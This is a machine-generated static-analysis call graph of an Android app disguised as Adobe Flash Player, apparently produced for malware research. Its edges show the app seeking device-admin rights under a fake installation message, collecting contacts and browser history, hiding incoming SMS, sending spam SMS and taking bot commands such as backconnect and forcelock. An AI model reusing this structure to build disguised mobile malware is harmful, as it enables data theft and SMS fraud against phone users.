VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)>("A", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: $r42 = staticinvoke <java.lang.Long: java.lang.Long valueOf(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.Long: java.lang.Long valueOf(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r1.<android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)>("android.app.extra.ADD_EXPLANATION", "FLASH_PLUGIN_INSTALLATION\n\n\u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0438 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u044f \u043a\u043e\u043c\u043f\u043e\u043d\u0435\u043d\u0442\u043e\u0432 com.adobe.flashplayer.\n\n\u041c\u043e\u0434\u0443\u043b\u044c \u0431\u0443\u0434\u0435\u0442 \u0437\u0430\u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0438\u0440\u043e\u0432\u0430\u043d \u043a\u0430\u043a Adobe Flash Player.\n\nFor get more information about us, please visit http://adobe.com.") in <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)> ==> <android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.MacrosStat: void onCreate()>() in <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)> ==> <com.adobe.flashplayer_.MacrosStat: void onCreate()>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: boolean contains(java.lang.CharSequence)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("sentSpam") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r3.<com.adobe.flashplayer.Certificate: void startActivity(android.content.Intent)>(r2) in <com.adobe.flashplayer.Certificate$1: void onClick(android.view.View)> ==> <android.app.Activity: void startActivity(android.content.Intent)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" [ End ] ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r20, "spamlist.txt", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int parseInt(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String valueOf(long)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r20, "contacts.txt", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r9) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onCreate(android.os.Bundle)>($r1) in <com.adobe.packages.BK: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void onCreate(android.os.Bundle)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("callBlock") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: $i0 = virtualinvoke $r24.<java.lang.String: int length()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int length()>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r15.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
VIRTUAL edge: $r25 = virtualinvoke $r21.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r29) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("#", "W") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>(byte[],java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r20, "browser_history.txt", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:SMSGATE") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.AdobeZCore: void onCreate()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeZCore: void onCreate()>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.packages.BK: void onCreate(android.os.Bundle)>(null) in <dummyMainClass: com.adobe.packages.BK dummyMainMethod_com_adobe_packages_BK(android.content.Intent)> ==> <com.adobe.packages.BK: void onCreate(android.os.Bundle)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r2.<android.content.Intent: void <init>(java.lang.String)>("android.app.action.ADD_DEVICE_ADMIN") in <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)> ==> <android.content.Intent: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("?") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
STATIC edge: r6 = staticinvoke <android.provider.Settings$Secure: java.lang.String getString(android.content.ContentResolver,java.lang.String)>($r11, "android_id") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.provider.Settings$Secure: java.lang.String getString(android.content.ContentResolver,java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: void setResultData(java.lang.String)>(null) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void setResultData(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer.Certificate: void sendBroadcast(android.content.Intent)>(r1) in <com.adobe.flashplayer.Certificate: void onWindowFocusChanged(boolean)> ==> <android.content.ContextWrapper: void sendBroadcast(android.content.Intent)>
VIRTUAL edge: r30 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.String: boolean contains(java.lang.CharSequence)>("OFF") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: void setResultData(java.lang.String)>(null) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void setResultData(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("|") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.StringBuffer: java.lang.String toString()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void <init>()>() in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <android.app.Service: void <init>()>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.Prefs$navW: void <init>(com.adobe.flashplayer_.Prefs)>($r1) in <com.adobe.flashplayer_.Prefs$navW: void <init>(com.adobe.flashplayer_.Prefs,com.adobe.flashplayer_.Prefs$navW)> ==> <com.adobe.flashplayer_.Prefs$navW: void <init>(com.adobe.flashplayer_.Prefs)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("MacrosAData", "User haven\'t accounts.", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $r34 = interfaceinvoke r5.<java.util.Map: java.util.Set keySet()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.util.TreeMap: java.util.Set keySet()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
VIRTUAL edge: virtualinvoke $r1.<android.content.Intent: android.content.Intent putExtra(java.lang.String,android.os.Parcelable)>("android.app.extra.DEVICE_ADMIN", $r4) in <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)> ==> <android.content.Intent: android.content.Intent putExtra(java.lang.String,android.os.Parcelable)>
VIRTUAL edge: virtualinvoke r3.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)> ==> <java.io.OutputStreamWriter: void close()>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void <init>()> ==> <android.content.BroadcastReceiver: void <init>()>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=backconnect_data&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Ha-ha!") in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r21.<java.lang.String: int indexOf(java.lang.String)>("On") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: $r3 = specialinvoke r0.<com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)>("forcelock", $r1) in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: $r24 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
SPECIAL edge: r4 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("?a=1&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_SMSGate", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r2 = virtualinvoke $r0.<com.adobe.flashplayer_.AdobeFlashCore: android.os.IBinder onBind(android.content.Intent)>(null) in <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeFlashCore: android.os.IBinder onBind(android.content.Intent)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void abortBroadcast()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void abortBroadcast()>
STATIC edge: $r3 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>($r24, $r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: $r9 = virtualinvoke $r10.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
STATIC edge: $r17 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
